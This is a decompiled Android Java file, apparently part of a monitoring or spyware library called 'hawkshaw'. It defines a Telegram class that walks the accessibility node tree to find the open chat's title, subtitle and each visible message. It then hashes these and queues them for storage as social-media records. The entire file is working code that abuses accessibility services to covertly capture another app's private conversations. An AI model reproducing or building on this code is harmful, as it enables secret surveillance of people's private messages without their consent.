package com.hawkshaw.library.features.accessibility.socialmedia;

import M1.a;
import M1.b;
import Y1.K;
import android.view.accessibility.AccessibilityNodeInfo;
import com.hawkshaw.library.datalayer.models.PackageName;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity;
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt;
import com.hawkshaw.library.ktextensions.StringsKt;
import j3.f;
import java.util.concurrent.ExecutorService;
import r3.j;

public final class Telegram {
    public static final Telegram INSTANCE = new Telegram();

    private Telegram() {
    }

    /* access modifiers changed from: private */
    public static final void extractMessages$lambda$0(UnprocessedSocialMediaEntity unprocessedSocialMediaEntity) {
        K.n(unprocessedSocialMediaEntity, "$entity");
        HandlerKt.insert(unprocessedSocialMediaEntity);
    }

    public final void extractMessages(AccessibilityNodeInfo accessibilityNodeInfo, ExecutorService executorService) {
        AccessibilityNodeInfo parent;
        AccessibilityNodeInfo childSafe;
        CharSequence text;
        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo;
        ExecutorService executorService2 = executorService;
        K.n(accessibilityNodeInfo2, "node");
        K.n(executorService2, "executor");
        AccessibilityNodeInfo findBy = AccessibilityUtilsKt.findBy(accessibilityNodeInfo2, b.f1295G);
        if (findBy == null || (parent = findBy.getParent()) == null || (childSafe = AccessibilityUtilsKt.getChildSafe(parent, 1)) == null) {
            Researcher.INSTANCE.print("no toolbar");
            return;
        }
        AccessibilityNodeInfo childSafe2 = AccessibilityUtilsKt.getChildSafe(childSafe, 1);
        CharSequence charSequence = null;
        CharSequence text2 = childSafe2 != null ? childSafe2.getText() : null;
        if (text2 == null) {
            Researcher.INSTANCE.print("no title");
            return;
        }
        AccessibilityNodeInfo childSafe3 = AccessibilityUtilsKt.getChildSafe(childSafe, 2);
        if (childSafe3 != null) {
            charSequence = childSafe3.getText();
        }
        AccessibilityNodeInfo findBy2 = AccessibilityUtilsKt.findBy(accessibilityNodeInfo2, b.f1294F);
        if (findBy2 == null) {
            Researcher.INSTANCE.print("no recycler view");
            return;
        }
        int childCount = findBy2.getChildCount();
        for (int i5 = 0; i5 < childCount; i5++) {
            AccessibilityNodeInfo child = findBy2.getChild(i5);
            if (!(child == null || (text = child.getText()) == null || j.U(text))) {
                PackageName packageName = PackageName.TELEGRAM;
                executorService2.execute(new a(new UnprocessedSocialMediaEntity(StringsKt.hash(text2 + "-" + text + "-" + packageName), StringsKt.getEmpty(text2), StringsKt.getEmpty(charSequence), (String) null, StringsKt.getEmpty(text), SocialMediaEntity.Type.Unknown, packageName, "", false, 256, (f) null), 1));
            }
        }
    }
}
